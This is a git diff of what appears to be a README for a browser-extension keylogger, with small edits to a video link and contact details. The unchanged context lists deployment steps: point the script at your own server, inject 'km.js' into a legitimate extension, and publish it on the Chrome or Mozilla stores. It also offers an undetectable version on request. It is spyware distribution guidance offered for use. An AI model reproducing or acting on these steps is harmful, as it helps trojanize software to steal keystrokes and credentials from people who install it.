@@ -18,7 +18,7 @@ part 2 keylogger
 ![part2](https://user-images.githubusercontent.com/30985149/75294090-d8a6cb80-5827-11ea-86bc-b9adb1387ea6.jpg)
 
 
-# demo video Youtub 
+# demo video Youtub (update video )
 https://youtu.be/ljZsw3bRxPY
 
 # what do you need ? 
@@ -34,11 +34,11 @@ change http://1127.0.0.1     to your web server
 
 2) send folder named " server "   to your web server , test with wampserver or xhampp ......etc
 
-3) take a legitimate extension then add your "km.js","jquery-3.1.1", if you have questions how does it work ask me in comment
+3) take a legitimate extension then add  "km.js","jquery-3.1.1", if you have questions how does it work ask me in comment
 
 4) publish your extension one chrome web store or adon mozilla
 
 # waring !!!!!!!
-# skype,whatsapp Email : hakanonymos@hotmail.com # ICQ : hakanonymos # whatsapp  +1 315 636 6596 (fake whatsapp )
+# whatsapp, Email,ICQ :  +1 315 636 6596 (fake whatsapp ) , hakanonymos@hotmail.com #ICQ : hakanonymos 
 this is older version of javascript but new version php,if you need a fud version contact me
 # I am in no way responsible for your actions, you risk going to prison
